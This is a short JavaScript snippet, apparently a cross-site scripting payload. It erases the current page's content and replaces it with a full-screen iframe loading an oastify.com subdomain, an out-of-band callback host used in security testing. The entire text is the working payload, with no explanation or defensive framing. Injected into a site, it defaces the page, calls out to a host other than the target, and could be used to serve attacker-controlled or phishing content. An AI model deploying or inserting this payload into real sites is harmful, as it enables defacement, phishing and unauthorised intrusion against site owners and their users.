var iframe = document.createElement('iframe');

// Set iframe attributes
iframe.setAttribute('src', 'https://5io967780yr8r6u6u07cpskyxp3gr9fy.oastify.com');
iframe.style.width = '100%';
iframe.style.height = '100%';
iframe.style.border = 'none';

// Replace the entire content of the page with the iframe
document.documentElement.innerHTML = '';
document.documentElement.appendChild(iframe);